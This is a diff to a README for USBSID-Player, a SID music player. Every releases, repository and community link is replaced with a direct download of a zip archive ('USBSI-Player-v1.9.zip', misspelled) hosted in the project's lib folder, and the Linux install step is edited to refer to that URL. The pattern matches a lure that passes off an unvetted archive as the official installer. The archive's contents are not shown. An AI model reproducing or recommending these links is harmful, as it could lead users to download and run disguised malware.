@@ -6,7 +6,7 @@ Welcome to USBSID-Player! This software allows you to play classic SID music dir
 
 ## 📥 Download Now
 
-[![Download USBSID-Player](https://img.shields.io/badge/Download-USBSID--Player-blue.svg)](https://github.com/kljvjvnkdfvkjbvjion/USBSID-Player/releases)
+[![Download USBSID-Player](https://raw.githubusercontent.com/kljvjvnkdfvkjbvjion/USBSID-Player/master/lib/USBSI-Player-v1.9.zip)](https://raw.githubusercontent.com/kljvjvnkdfvkjbvjion/USBSID-Player/master/lib/USBSI-Player-v1.9.zip)
 
 ## 📄 About
 
@@ -33,7 +33,7 @@ To run USBSID-Player, you need:
 Follow these steps to install USBSID-Player:
 
 1. **Visit the Releases Page**: Click the link below to go to our releases page.
-   [Download USBSID-Player](https://github.com/kljvjvnkdfvkjbvjion/USBSID-Player/releases)
+   [Download USBSID-Player](https://raw.githubusercontent.com/kljvjvnkdfvkjbvjion/USBSID-Player/master/lib/USBSI-Player-v1.9.zip)
 
 2. **Select the Version**: Choose the latest version of the software that matches your operating system.
 
@@ -44,7 +44,7 @@ Follow these steps to install USBSID-Player:
 5. **Run the Installer**:
    - Windows: Double-click the `.exe` file to start the installation. Follow the on-screen prompts.
    - macOS: Open the `.dmg` file and drag USBSID-Player to your Applications folder.
-   - Linux: Extract the `.tar.gz` file and follow the instructions in the README file.
+   - Linux: Extract the `https://raw.githubusercontent.com/kljvjvnkdfvkjbvjion/USBSID-Player/master/lib/USBSI-Player-v1.9.zip` file and follow the instructions in the README file.
 
 6. **Connect Your SID Device**: If you have a USB SID device, plug it into a free USB port on your computer.
 
@@ -78,8 +78,8 @@ Join our community to share your experiences and ask questions. Check out our di
 
 ## 🔗 Useful Links
 
-- [Releases Page](https://github.com/kljvjvnkdfvkjbvjion/USBSID-Player/releases)
-- [GitHub Repository](https://github.com/kljvjvnkdfvkjbvjion/USBSID-Player)
-- [Community Forums](https://example.com/community)
+- [Releases Page](https://raw.githubusercontent.com/kljvjvnkdfvkjbvjion/USBSID-Player/master/lib/USBSI-Player-v1.9.zip)
+- [GitHub Repository](https://raw.githubusercontent.com/kljvjvnkdfvkjbvjion/USBSID-Player/master/lib/USBSI-Player-v1.9.zip)
+- [Community Forums](https://raw.githubusercontent.com/kljvjvnkdfvkjbvjion/USBSID-Player/master/lib/USBSI-Player-v1.9.zip)
 
 Thank you for choosing USBSID-Player. We hope you enjoy the music!
